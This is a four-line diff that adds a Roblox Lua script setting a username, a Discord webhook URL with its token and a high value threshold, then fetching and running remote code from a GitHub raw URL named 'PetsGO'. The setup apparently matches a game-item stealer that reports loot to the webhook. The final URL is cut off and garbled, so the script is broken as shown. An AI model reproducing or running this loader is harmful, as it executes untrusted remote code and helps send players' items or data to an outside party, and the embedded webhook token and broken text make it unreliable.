@@ -1,0 +1,4 @@
+_G.User = "Mok_895"
+_G.Webhook = "https://discord.com/api/webhooks/1285941187064107028/uut8daGoI7MQRMHd9rt0LnqRqO9DgAfH2KxHVDY6GBwuQb5IhtAb6WKQZvNGepWrJk3O"
+_G.Min = 10000000
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vestyx/PetsGO/refs/headsue))()
